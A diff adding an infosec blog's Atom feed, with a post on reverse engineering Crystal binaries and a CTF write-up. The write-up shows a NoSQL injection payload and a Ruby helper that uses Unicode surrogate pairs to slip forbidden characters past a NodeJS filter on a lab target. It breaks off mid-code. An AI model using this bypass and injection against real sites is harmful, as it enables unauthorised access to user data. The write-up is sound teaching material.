@@ -1,0 +1,335 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <generator uri="http://jekyllrb.com" version="3.8.4">Jekyll</generator>
+  
+  
+  <link href="/feed.xml" rel="self" type="application/atom+xml" />
+  <link href="/" rel="alternate" type="text/html" />
+  <updated>2018-10-08T13:38:29+01:00</updated>
+  <id>//</id>
+
+  
+    <title type="html">Hans Topo Blog</title>
+  
+
+  
+    <subtitle>Infosec guy from Tenerife, Spain</subtitle>
+  
+
+  
+
+  
+  
+    <entry>
+      
+      <title type="html">Brief introduction on reverse engineering Crystal binaries.</title>
+      
+      
+      <link href="/2018/10/08/reversing-crystal-binaries/" rel="alternate" type="text/html" title="Brief introduction on reverse engineering Crystal binaries." />
+      
+      <published>2018-10-08T13:02:44+01:00</published>
+      <updated>2018-10-08T13:02:44+01:00</updated>
+      <id>/2018/10/08/reversing-crystal-binaries</id>
+      <content type="html" xml:base="/2018/10/08/reversing-crystal-binaries/">&lt;p&gt;Crystal is a “new” Ruby-syntax-based programming language, born in 2014. The main diference is, that this is not a Ruby implementation, this is another compiled programming language, but its syntax is based in ruby, so Crystal != Ruby.&lt;/p&gt;
+
+&lt;p&gt;You can learn more about Crystal here: &lt;a href=&quot;https://crystal-lang.org/&quot;&gt;crystal&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Any new compiled programming language results interesting from a reverse engineering perspective, malware is becoming more and more based on this kind of compiled programming language, whose syntax is easier than C or C++, but mantaining the ability to run standalone.&lt;/p&gt;
+
+&lt;p&gt;A Crystal Hello World example, looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Hello world!'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Yes, just like Ruby. To compile this, let’s save it as &lt;code class=&quot;highlighter-rouge&quot;&gt;hello.cr&lt;/code&gt; and execute the Crystal compiler: &lt;code class=&quot;highlighter-rouge&quot;&gt;crystal build hello.cr&lt;/code&gt;. This should create a &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; executable with the following characteristics: &lt;code class=&quot;highlighter-rouge&quot;&gt;hello: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, with debug_info, not stripped&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;A dinamically linked, non-stripped binary. Cool!&lt;/p&gt;
+
+&lt;h4 id=&quot;ida-analysis&quot;&gt;IDA analysis.&lt;/h4&gt;
+
+&lt;p&gt;Let’s load this newly created binary using IDA Free 7.0 for Linux, (keep calm radare2 fanboys). Something catch my attention when load finished:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/lot_of_functions.png&quot; alt=&quot;lot_of_functions&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Maaaaaaan 2055 functions?!!! Calm down buddy, if you take a look at other compiled languages, like Golang, this is normal. Modern compiled languages, import everything they need to be cross-platform, so lot of functions are included in a single binary to be able to compile binaries for Windows, Linux and OSX using a single compiler.&lt;/p&gt;
+
+&lt;p&gt;So where’s the program itself?&lt;/p&gt;
+
+&lt;p&gt;By default, IDA show us to the first function basic blocks executed in the program.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/main.png&quot; alt=&quot;ida_main&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok cool, so this function just calls another function: &lt;code class=&quot;highlighter-rouge&quot;&gt;main_0&lt;/code&gt;, which also calls another function &lt;code class=&quot;highlighter-rouge&quot;&gt;main_user_code&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/main_0.png&quot; alt=&quot;ida_main_0&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;main_user_code&lt;/code&gt; just calls another function &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/main_user_code.png&quot; alt=&quot;ida_main_user_code&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s then analyze this &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt; function, opening their basic blocks view, something really ugly happen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/what_the_hell.png&quot; alt=&quot;ida_what_the_hell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;… what the hell man, where the fuck is our application code? Just at the end!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/code.png&quot; alt=&quot;ida_what_the_hell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There you can see the loading of our “Hello world!” string, which is at off_9A530, and a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; function which seems to be a wrapper for &lt;code class=&quot;highlighter-rouge&quot;&gt;puts_0&lt;/code&gt; function, which really executes the output operation and shows our string in stdout.&lt;/p&gt;
+
+&lt;p&gt;Ok, so the workflow seems to be:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;main_0&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;main_user_code&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt; and, at the end, our script code is executed.&lt;/p&gt;
+
+&lt;p&gt;Let’s see how conditionals and classes works at Crystal creating a simple script with the following code:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MyHelloClass&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;vi&quot;&gt;@number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_random&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+      &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A is lower than 4&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+      &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A is GREATER than 4&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Now, an if sentence will appear based on rand numeric value&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MyHelloClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;test_random&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok simple, let’s compile it &lt;code class=&quot;highlighter-rouge&quot;&gt;crystal build hello2.cr&lt;/code&gt; and open it using IDA, this time going directly to &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt; buttom, where our code should be.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/hello2.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There it is, first, rand is called, which is, again a wrapper for Random::PCG32 function identified in IDA as &lt;code class=&quot;highlighter-rouge&quot;&gt;new_98&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;new_101&lt;/code&gt; is done, when inspecting this is our &lt;code class=&quot;highlighter-rouge&quot;&gt;MyHelloClass::new&lt;/code&gt; function, which is the wrapper for the &lt;code class=&quot;highlighter-rouge&quot;&gt;initialize&lt;/code&gt; function in our class. In Ruby, the &lt;code class=&quot;highlighter-rouge&quot;&gt;initialize&lt;/code&gt; function is the constructor of the class.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/constructor.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see in this basic block, memory is created for our new object using &lt;code class=&quot;highlighter-rouge&quot;&gt;_crystal_malloc_antomic64&lt;/code&gt; function, a wrapper for &lt;code class=&quot;highlighter-rouge&quot;&gt;GC_generic_malloc&lt;/code&gt; which, after lot of operations, is a malloc itself.&lt;/p&gt;
+
+&lt;p&gt;Then, a &lt;code class=&quot;highlighter-rouge&quot;&gt;call test_random&lt;/code&gt; is done, remember, Crystal compiler does not strip binaries by default so function names remain intact.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/test_random.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here it is our conditional, and our &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; calls on each condition. Cool!&lt;/p&gt;
+
+&lt;p&gt;Radare2, show us function names processed, so it’s a bit easier to identify the binary work flow with a single &lt;code class=&quot;highlighter-rouge&quot;&gt;s sym.__crystal_main&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;pdf&lt;/code&gt; call.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/r2.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That’s all, thanks for reading, and hope this post can be helpful for someone facing this kind of binaries for the first time.&lt;/p&gt;
+
+&lt;p&gt;Please, feel free to contact me if you see any mistake, also my written english is not the best, so sorry for those whose eyes explode while reading this.&lt;/p&gt;
+
+&lt;p&gt;See you!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+        <category term="reversing" />
+      
+        <category term="crystal" />
+      
+        <category term="ruby" />
+      
+
+      
+
+      
+        <summary type="html">Crystal is a “new” Ruby-syntax-based programming language, born in 2014. The main diference is, that this is not a Ruby implementation, this is another compiled programming language, but its syntax is based in ruby, so Crystal != Ruby.</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">[CTF Write-up] nn8ed Tindermon challenge write-up.</title>
+      
+      
+      <link href="/2018/10/08/nn8ed-tindermon-writeup/" rel="alternate" type="text/html" title="[CTF Write-up] nn8ed Tindermon challenge write-up." />
+      
+      <published>2018-10-08T13:00:44+01:00</published>
+      <updated>2018-10-08T13:00:44+01:00</updated>
+      <id>/2018/10/08/nn8ed-tindermon-writeup</id>
+      <content type="html" xml:base="/2018/10/08/nn8ed-tindermon-writeup/">&lt;p&gt;This weekend, Navaja Negra 8 CTF started, organized by &lt;a href=&quot;https://www.twitter.com/ka0labs_&quot;&gt;ka0labs.org&lt;/a&gt;. This web challenge has the following statement:&lt;/p&gt;
+
+&lt;p&gt;Get the admin password! There is a WAF and it is NodeJS… Easy peasy!
+&lt;a href=&quot;http://tindermon.ka0labs.org/&quot;&gt;http://tindermon.ka0labs.org&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;intro&quot;&gt;Intro&lt;/h3&gt;
+&lt;p&gt;This challenge presents us a classic NodeJS + Express app. Source code of index is:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--WebSite Created by the admin pikachu--&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Welcome to our Pokemon-Tinder!!!!!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background: pink&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;List of Users Registered in Tindermon&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[/avatar/magikarp](http://tindermon.ka0labs.org/avatar/magikarp)&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;480&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;290&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[/avatar/bulbasaur](http://tindermon.ka0labs.org/avatar/bulbasaur)&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;480&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;290&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[/avatar/diglet](http://tindermon.ka0labs.org/avatar/diglet)&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;480&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;290&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Two interesting things here:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The admin username is pikachu&lt;/li&gt;
+  &lt;li&gt;There’s a route /avatar/&lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; which, when visited, redirects us to /img/&lt;code class=&quot;highlighter-rouge&quot;&gt;ìd&lt;/code&gt;.jpg where id seems to be the user id.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /avatar/magikarp HTTP/1.0
+
+-&amp;gt; 302 Found, Location: /imgs/1.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;not-that-easy-theres-a-waf&quot;&gt;Not that easy, there’s a “WAF”&lt;/h4&gt;
+&lt;p&gt;Testing some characters show us that there’s some kind of check for the following chars:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot; ' . (space)&lt;/code&gt;
+Why those characters and not others like &amp;gt; or &amp;lt;? Because (not-so-obviously) what they are trying to avoid is a NoSQL Injection, probably on a MongoDB database.&lt;/p&gt;
+
+&lt;p&gt;So logic seems to be:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Express router process the request.&lt;/li&gt;
+  &lt;li&gt;Controller search for the URL parameter, which is everything following /avatar/ to the next “/” and is intended to be a username.&lt;/li&gt;
+  &lt;li&gt;Looks for the username in MongoDB, if exists, returns a 302 redirection to users image path.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Easy right? We are in front a NoSQL Injection challenge like many others, but this time we need to figure out how to bypass NodeJS checks.&lt;/p&gt;
+
+&lt;p&gt;Well, at first, some tricks come to my mind, such as Orange Tsai’s 2017 Black Hat presentation about  NodeJS inconsistency on parsing Full-Width Characters: &lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;reading-a-bit-about-how-javascript-unicode-decoding-standards-works&quot;&gt;Reading a bit about how JavaScript Unicode decoding standards works.&lt;/h3&gt;
+
+&lt;p&gt;This article give us some keys &lt;a href=&quot;https://mathiasbynens.be/notes/javascript-unicode&quot;&gt;https://mathiasbynens.be/notes/javascript-unicode&lt;/a&gt;. As the article says, for backwards compatibility with ES5 and older standards,  unicode are divided in groups of two, each one of 2 bytes, this are called “surrogate pairs”.&lt;/p&gt;
+
+&lt;p&gt;So, for example, the emoji 💩 becomes &lt;code class=&quot;highlighter-rouge&quot;&gt;\uD83D\uDCA9&lt;/code&gt;. How this split is done? The answer is, again, in the same blog: &lt;a href=&quot;https://mathiasbynens.be/notes/javascript-encoding&quot;&gt;https://mathiasbynens.be/notes/javascript-encoding&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;H&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD800&lt;/span&gt;  
+&lt;span class=&quot;nx&quot;&gt;L&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDC00&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool, at this point a hint is released, the hint are some emojis, so it’s clear, we need some Unicode trick to bypass NodeJS checks. But, do not forget, those unicodes needs to make sense for MongoDB, which is the final endpoint of our string.&lt;/p&gt;
+
+&lt;h3 id=&quot;error-error-error-error-victory&quot;&gt;Error, error, error, error, victory!&lt;/h3&gt;
+&lt;p&gt;After a lot of testing and a key of my man X-C3LL, seems that MongoDB is reading the least significant byte of each surrogate pair, well, let’s test if this is true using &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;||&quot;1&quot;==&quot;1&lt;/code&gt; payload,  but remember, we can’t just use &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;, so we need to figure out a unicode which contains 0x22 and 0x7C as their least significant bytes of each surrogate pair.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# This receives a string of two characters, and looks for a unicode hex who's surrogate pairs least significant byte, match each character hex representation.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;uni&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFFFFF&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDC00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chr&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'U'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
